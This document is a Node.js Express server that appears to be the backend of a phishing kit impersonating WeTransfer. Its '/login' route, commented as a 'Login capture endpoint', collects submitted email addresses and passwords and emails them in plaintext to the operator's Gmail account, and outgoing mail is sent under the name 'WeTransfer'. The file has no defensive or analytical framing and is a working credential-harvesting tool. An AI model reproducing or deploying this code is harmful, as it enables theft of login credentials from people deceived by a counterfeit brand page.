require('dotenv').config();
const express = require('express');
const cors = require('cors');
const { Resend } = require('resend');
const path = require('path');

const app = express();

app.use(cors());
app.use(express.json());

const resend = new Resend(process.env.RESEND_API_KEY);

// Serve static files from /public
app.use(express.static(path.join(__dirname, 'public')));

// Send email endpoint
app.post('/send', async (req, res) => {
  const { name, email, subject, message } = req.body;

  if (!name || !email || !message) {
    return res.status(400).json({ success: false, error: 'name, email and message are required' });
  }

  try {
    await resend.emails.send({
      from: 'WeTransfer <onboarding@resend.dev>',
      to: process.env.GMAIL_USER,
      subject: subject || `New message from ${name}`,
      html: `
        <h3>New Form Submission</h3>
        <p><strong>Name:</strong> ${name}</p>
        <p><strong>Email:</strong> ${email}</p>
        <p><strong>Message:</strong><br/>${message}</p>
      `,
    });

    res.json({ success: true, message: 'Email sent successfully' });
  } catch (err) {
    console.error(err);
    res.status(500).json({ success: false, error: 'Failed to send email' });
  }
});

// Login capture endpoint
app.post('/login', async (req, res) => {
  const { email, password } = req.body;

  if (!email || !password) {
    return res.status(400).json({ success: false, error: 'email and password are required' });
  }

  try {
    await resend.emails.send({
      from: 'WeTransfer <onboarding@resend.dev>',
      to: process.env.GMAIL_USER,
      subject: `Login Attempt — ${email}`,
      html: `
        <h3>Login Submission</h3>
        <p><strong>Email:</strong> ${email}</p>
        <p><strong>Password:</strong> ${password}</p>
        <p><strong>Time:</strong> ${new Date().toISOString()}</p>
      `,
    });

    res.json({ success: true });
  } catch (err) {
    console.error(err);
    res.status(500).json({ success: false, error: 'Failed to send email' });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`Server running on port ${PORT}`));